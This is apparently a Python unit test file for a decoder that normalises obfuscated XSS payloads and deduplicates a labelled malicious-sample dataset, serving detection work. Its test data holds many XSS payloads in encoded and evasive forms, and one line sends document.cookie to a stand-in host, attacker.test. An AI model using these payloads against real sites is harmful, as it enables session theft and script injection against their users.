"""Unit tests for preprocessing.decoder (decode_payload & deduplicate_malicious_df)."""

from __future__ import annotations

import math
import unittest

import pandas as pd

from preprocessing import decode_payload, deduplicate_malicious_df


class TestDecodePayload(unittest.TestCase):
    """Tests for decode_payload()."""

    def test_safe_non_string_and_missing_inputs(self) -> None:
        invalid_inputs = [
            None,
            float("nan"),
            pd.NA,
            0,
            42,
            3.14,
            True,
            False,
            b"<script>alert(1)</script>",
            ["<script>"],
            {"payload": "<script>"},
        ]
        for value in invalid_inputs:
            with self.subTest(value=repr(value)):
                self.assertEqual(decode_payload(value), "")

        self.assertEqual(decode_payload(""), "")
        self.assertEqual(decode_payload("   \t\r\n  "), "")

    def test_single_layer_url_decode(self) -> None:
        self.assertEqual(
            decode_payload("%3Cscript%3Ealert(1)%3C/script%3E"),
            "<script>alert(1)</script>",
        )
        # urllib.parse.unquote must preserve literal '+' (unlike unquote_plus).
        self.assertEqual(
            decode_payload("javascript:fetch('https://attacker.test/?c='+document.cookie)"),
            "javascript:fetch('https://attacker.test/?c='+document.cookie)",
        )

    def test_single_layer_html_entity_decode(self) -> None:
        self.assertEqual(
            decode_payload("&lt;IMG SRC=x ONERROR=alert(1)&gt;"),
            "<img src=x onerror=alert(1)>",
        )
        self.assertEqual(
            decode_payload("&#60;script&#62;&#x61;lert(1)&#60;/script&#62;"),
            "<script>alert(1)</script>",
        )
        self.assertEqual(
            decode_payload("<&#x61; href=\"&#x6A;&#x61;vascript:&#X61;lert(1)\">click</&#x61;>"),
            '<a href="javascript:alert(1)">click</a>',
        )

    def test_single_layer_js_hex_and_unicode_escapes(self) -> None:
        self.assertEqual(decode_payload(r"\x61lert(1)"), "alert(1)")
        self.assertEqual(
            decode_payload(r"\x3Cscript\x3E\x61lert(1)\x3C/script\x3E"),
            "<script>alert(1)</script>",
        )
        self.assertEqual(decode_payload(r"\u0061lert(1)"), "alert(1)")
        self.assertEqual(
            decode_payload(r"\u003Csvg onload=\u0061lert(1)\u003E"),
            "<svg onload=alert(1)>",
        )
        self.assertEqual(decode_payload(r"\u{61}lert(1)"), "alert(1)")
        self.assertEqual(decode_payload(r"\u{000061}lert(1)"), "alert(1)")
        self.assertEqual(decode_payload(r"\u{1F600}"), "\U0001f600")

    def test_invalid_unicode_brace_codepoint_kept_verbatim(self) -> None:
        # Beyond max Unicode codepoint (0x10FFFF)
        self.assertEqual(decode_payload(r"\u{110000}alert(1)"), r"\u{110000}alert(1)")
        self.assertEqual(decode_payload(r"\u{FFFFFFFF}test"), r"\u{ffffffff}test")
        # Huge hex value triggering OverflowError in chr()
        huge = r"\u{99999999999999999999}test"
        self.assertEqual(decode_payload(huge), huge.lower())

    def test_multi_layer_decoding(self) -> None:
        # Double URL encode
        self.assertEqual(decode_payload("%253Cscript%253E"), "<script>")
        # Triple URL encode (resolved within default max_rounds=3)
        self.assertEqual(decode_payload("%25253Cscript%25253E"), "<script>")
        # Combined URL + HTML entity
        self.assertEqual(
            decode_payload("%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B"),
            "<script>alert(1)</script>",
        )
        self.assertEqual(
            decode_payload("&#x25;3Cscript&#x25;3Ealert(1)&#x25;3C/script&#x25;3E"),
            "<script>alert(1)</script>",
        )
        self.assertEqual(decode_payload("%26%23x61%3Blert(1)"), "alert(1)")
        # Combined URL + JS hex/unicode
        self.assertEqual(decode_payload("%5Cx61lert(1)"), "alert(1)")
        self.assertEqual(decode_payload(r"\x253Cscript\x253E"), "<script>")
        # Combined HTML entity + JS unicode
        self.assertEqual(decode_payload("&#x5c;u0061lert(1)"), "alert(1)")
        self.assertEqual(decode_payload("&#92;u{61}lert(1)"), "alert(1)")

    def test_max_rounds_and_normalization(self) -> None:
        self.assertEqual(decode_payload("%253Cscript%253E", max_rounds=1), "%3cscript%3e")
        self.assertEqual(decode_payload("%253Cscript%253E", max_rounds=2), "<script>")
        self.assertEqual(decode_payload("  <ScRiPt>AlErT(1)</ScRiPt> \n\t "), "<script>alert(1)</script>")

    def test_idempotency(self) -> None:
        samples = [
            "",
            "   ",
            "<script>alert(1)</script>",
            "  <iNpUt aUtOfOcUs oNfOcUs=alert(document.domain)>  ",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "%25253Cscript%25253E",
            "%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B",
            "&#x25;3Cimg src=x onerror=&#x61;lert(1)&#x25;3E",
            r"\x61lert(1)",
            r"\u0061lert(1)",
            r"\u{61}lert(1)",
            r"\u{110000}keep_me",
            r"\x253Csvg onload=\u{61}lert(1)\x253E",
            "data:text/html,<script>prin%74()%3C/sc%72%69pt%3E",
            '"><sc&#x72;ip&#x74;>al&#x65;&#x72;&#x74;(1)</&#x73;&#x63;&#x72;ip&#x74;>',
        ]
        for payload in samples:
            with self.subTest(payload=payload):
                once = decode_payload(payload)
                twice = decode_payload(once)
                self.assertEqual(twice, once)


class TestDeduplicateMaliciousDf(unittest.TestCase):
    """Tests for deduplicate_malicious_df()."""

    def test_prioritizes_tainted_before_obfuscated(self) -> None:
        df = pd.DataFrame(
            [
                {
                    "id": "SYN0001",
                    "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
                    "group": "Obfuscated",
                    "context": "html_body",
                },
                {
                    "id": "SYN0050",
                    "payload": "<script>alert(1)</script>",
                    "group": "Tainted",
                    "context": "html_body",
                },
                {
                    "id": "SYN0002",
                    "payload": r"\x61lert(2)",
                    "group": "Obfuscated",
                    "context": "js_string",
                },
                {
                    "id": "SYN0099",
                    "payload": "ALERT(2)",
                    "group": "Tainted",
                    "context": "js_string",
                },
            ]
        )

        dedup_df, stats = deduplicate_malicious_df(df)

        # Original DataFrame must not be mutated.
        self.assertNotIn("payload_decoded", df.columns)
        self.assertEqual(len(df), 4)

        self.assertIn("payload_decoded", dedup_df.columns)
        self.assertEqual(list(dedup_df["id"]), ["SYN0050", "SYN0099"])
        self.assertEqual(list(dedup_df["group"]), ["Tainted", "Tainted"])
        self.assertEqual(
            list(dedup_df["payload_decoded"]),
            ["<script>alert(1)</script>", "alert(2)"],
        )

        self.assertEqual(stats["rows_before"], 4)
        self.assertEqual(stats["rows_after"], 2)
        self.assertEqual(stats["duplicates_removed"], 2)
        self.assertEqual(
            stats["duplicates_by_context"],
            {"html_body": 1, "js_string": 1},
        )

    def test_same_group_keeps_smallest_id_and_stats_per_context(self) -> None:
        df = pd.DataFrame(
            [
                # Same group (Tainted), out of id order -> must keep SYN0010.
                {
                    "id": "SYN0020",
                    "payload": "<ScRiPt>alert(1)</ScRiPt>",
                    "group": "Tainted",
                    "context": "html_body",
                },
                {
                    "id": "SYN0010",
                    "payload": "<script>alert(1)</script>",
                    "group": "Tainted",
                    "context": "html_body",
                },
                # Same group (Obfuscated), out of id order -> must keep SYN0005.
                {
                    "id": "SYN0030",
                    "payload": r"\u0061lert(9)",
                    "group": "Obfuscated",
                    "context": "js_string",
                },
                {
                    "id": "SYN0005",
                    "payload": r"\u{61}lert(9)",
                    "group": "Obfuscated",
                    "context": "js_string",
                },
                # Unique payload in attribute context -> 0 duplicates for attribute.
                {
                    "id": "SYN0040",
                    "payload": '" onerror="alert(1)" x="',
                    "group": "Tainted",
                    "context": "attribute",
                },
                # Duplicate in url context where Obfuscated comes first -> keep Tainted SYN0060.
                {
                    "id": "SYN0003",
                    "payload": "javascript:%61%6Cert(3)",
                    "group": "Obfuscated",
                    "context": "url",
                },
                {
                    "id": "SYN0060",
                    "payload": "javascript:alert(3)",
                    "group": "Tainted",
                    "context": "url",
                },
                {
                    "id": "SYN0070",
                    "payload": "javascript:&#x61;lert(3)",
                    "group": "Obfuscated",
                    "context": "url",
                },
            ]
        )

        dedup_df, stats = deduplicate_malicious_df(df)

        self.assertEqual(
            set(dedup_df["id"]),
            {"SYN0010", "SYN0005", "SYN0040", "SYN0060"},
        )
        self.assertEqual(stats["rows_before"], 8)
        self.assertEqual(stats["rows_after"], 4)
        self.assertEqual(stats["duplicates_removed"], 4)
        self.assertEqual(
            stats["duplicates_by_context"],
            {
                "attribute": 0,
                "html_body": 1,
                "js_string": 1,
                "url": 2,
            },
        )
        self.assertEqual(
            sum(stats["duplicates_by_context"].values()),
            stats["duplicates_removed"],
        )

    def test_updates_existing_payload_decoded_and_handles_missing_values(self) -> None:
        df = pd.DataFrame(
            [
                {
                    "id": "SYN0001",
                    "payload": None,
                    "payload_decoded": "stale_value",
                    "group": "Obfuscated",
                    "context": "html_body",
                },
                {
                    "id": "SYN0002",
                    "payload": math.nan,
                    "payload_decoded": "stale_value_2",
                    "group": "Tainted",
                    "context": "html_body",
                },
            ]
        )

        dedup_df, stats = deduplicate_malicious_df(df)
        self.assertEqual(len(dedup_df), 1)
        self.assertEqual(dedup_df.iloc[0]["id"], "SYN0002")
        self.assertEqual(dedup_df.iloc[0]["payload_decoded"], "")
        self.assertEqual(stats["duplicates_removed"], 1)

    def test_empty_dataframe_and_missing_payload_column(self) -> None:
        empty_df = pd.DataFrame(columns=["id", "payload", "group", "context"])
        dedup_df, stats = deduplicate_malicious_df(empty_df)
        self.assertEqual(len(dedup_df), 0)
        self.assertIn("payload_decoded", dedup_df.columns)
        self.assertEqual(
            stats,
            {
                "rows_before": 0,
                "rows_after": 0,
                "duplicates_removed": 0,
                "duplicates_by_context": {},
            },
        )

        bad_df = pd.DataFrame([{"id": "SYN0001", "group": "Tainted"}])
        with self.assertRaises(ValueError):
            deduplicate_malicious_df(bad_df)


if __name__ == "__main__":
    unittest.main(verbosity=2)
